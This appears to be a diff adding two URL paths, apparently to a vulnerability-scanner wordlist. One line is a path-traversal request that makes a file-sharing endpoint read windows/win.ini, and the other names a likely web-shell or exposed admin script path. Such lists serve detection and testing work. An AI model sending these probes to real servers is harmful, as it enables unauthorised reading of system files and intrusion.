@@ -1,0 +1,2 @@
+/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini
+/Runtime/Data/ms_admin.php
